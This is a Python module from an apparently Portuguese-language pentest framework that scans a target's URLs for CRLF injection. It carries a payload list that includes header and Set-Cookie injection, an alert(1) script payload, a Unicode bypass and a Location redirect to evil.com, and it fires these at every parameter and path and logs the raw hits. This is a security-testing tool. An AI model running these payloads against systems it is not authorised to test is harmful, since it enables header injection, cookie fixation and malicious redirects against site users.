#!/usr/bin/env python3
"""
CRLF Injection Scanner — Testa injeção de \\r\\n em parâmetros
Verifica se headers customizados aparecem na resposta HTTP
Captura raw request/response para Burp modal
"""
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote

from menu import C
from ..output import info, success, warn, error
from ..http_utils import format_raw_request, format_raw_response

try:
    import httpx
except ImportError:
    httpx = None


# Payloads CRLF
CRLF_PAYLOADS = [
    "%0d%0aX-CRLF-Test:%20injected",
    "%0d%0aSet-Cookie:%20crlf=injected",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0D%0AX-CRLF-Test:%20injected",
    "\\r\\nX-CRLF-Test: injected",
    "%E5%98%8A%E5%98%8DX-CRLF-Test:%20injected",  # Unicode bypass
    "%0d%0aLocation:%20http://evil.com",
]

# Header que indica CRLF bem-sucedido
CRLF_INDICATOR = "x-crlf-test"
COOKIE_INDICATOR = "crlf=injected"


def ensure_outdir(target):
    outdir = Path("output") / target / "crlf_injection"
    outdir.mkdir(parents=True, exist_ok=True)
    return outdir


def test_crlf(client, url, payload):
    """Testa CRLF injection em todos os parâmetros de uma URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    
    findings = []
    
    # Teste em parâmetros existentes
    for param_name in list(params.keys()):
        new_params = params.copy()
        new_params[param_name] = [payload]
        new_query = urlencode(new_params, doseq=True, quote_via=lambda s, safe, encoding=None, errors=None: s)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            resp = client.get(test_url, timeout=10, follow_redirects=False)
            
            # Verificar se header injetado apareceu na resposta
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            
            crlf_found = False
            inject_type = ""
            
            if CRLF_INDICATOR in headers_lower:
                crlf_found = True
                inject_type = "Header Injection"
            elif any(COOKIE_INDICATOR in v for v in resp.headers.get("set-cookie", "").split(";")):
                crlf_found = True
                inject_type = "Cookie Injection"
            elif "location" in headers_lower and "evil.com" in headers_lower.get("location", ""):
                crlf_found = True
                inject_type = "Header Redirect Injection"
            
            if crlf_found:
                raw_req = format_raw_request("GET", test_url, dict(resp.request.headers))
                raw_res = format_raw_response(resp.status_code, dict(resp.headers), resp.text[:2000])
                findings.append({
                    "url": url,
                    "test_url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "type": inject_type,
                    "risk": "HIGH",
                    "status": resp.status_code,
                    "details": f"CRLF Injection via parâmetro '{param_name}' — {inject_type}",
                    "request_raw": raw_req,
                    "response_raw": raw_res,
                })
                
        except Exception:
            pass
    
    # Teste também no path
    try:
        test_path = parsed.path + payload
        test_url = urlunparse(parsed._replace(path=test_path))
        resp = client.get(test_url, timeout=10, follow_redirects=False)
        headers_lower = {k.lower(): v for k, v in resp.headers.items()}
        
        if CRLF_INDICATOR in headers_lower:
            raw_req = format_raw_request("GET", test_url, dict(resp.request.headers))
            raw_res = format_raw_response(resp.status_code, dict(resp.headers), resp.text[:2000])
            findings.append({
                "url": url,
                "test_url": test_url,
                "parameter": "PATH",
                "payload": payload,
                "type": "Path CRLF Injection",
                "risk": "HIGH",
                "status": resp.status_code,
                "details": f"CRLF Injection via path — Header injetado",
                "request_raw": raw_req,
                "response_raw": raw_res,
            })
    except Exception:
        pass
    
    return findings


def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
    
    if not httpx:
        error("httpx não instalado")
        return []

    info(
        f"\n🟥───────────────────────────────────────────────────────────🟥\n"
        f"   💉  {C.BOLD}{C.CYAN}CRLF INJECTION SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟥───────────────────────────────────────────────────────────🟥\n"
    )

    outdir = ensure_outdir(target)
    results_file = outdir / "crlf_results.json"
    
    # Carregar URLs
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
    
    if not urls_file.exists():
        warn("Nenhum arquivo de URLs encontrado")
        return []
    
    all_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    
    # Filtrar URLs que têm parâmetros
    testable = [u for u in all_urls if "?" in u]
    
    # Adicionar URLs sem parâmetros (testar no path)
    no_params = [u for u in all_urls if "?" not in u][:50]
    testable.extend(no_params)
    
    testable = testable[:150]
    
    if not testable:
        info("Nenhuma URL encontrada para testar")
        json.dump([], open(results_file, "w"))
        return [str(results_file)]
    
    info(f"   📊 Testando {len(testable)} URLs")
    
    all_findings = []
    
    with httpx.Client(verify=False, follow_redirects=False, timeout=10) as client:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for url in testable:
                for payload in CRLF_PAYLOADS:
                    future = executor.submit(test_crlf, client, url, payload)
                    futures[future] = url
            
            for future in as_completed(futures):
                try:
                    results = future.result()
                    if results:
                        all_findings.extend(results)
                        url = futures[future]
                        info(f"   🚨 {C.RED}CRLF: {url}{C.END}")
                except Exception:
                    pass
    
    # Deduplicar
    seen = set()
    deduped = []
    for f in all_findings:
        key = (f["url"], f["parameter"], f["type"])
        if key not in seen:
            seen.add(key)
            deduped.append(f)
    
    results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
    
    if deduped:
        success(f"💉 {len(deduped)} CRLF Injections encontrados!")
    else:
        success("✅ Nenhuma CRLF Injection detectada")
    
    return [str(results_file)]
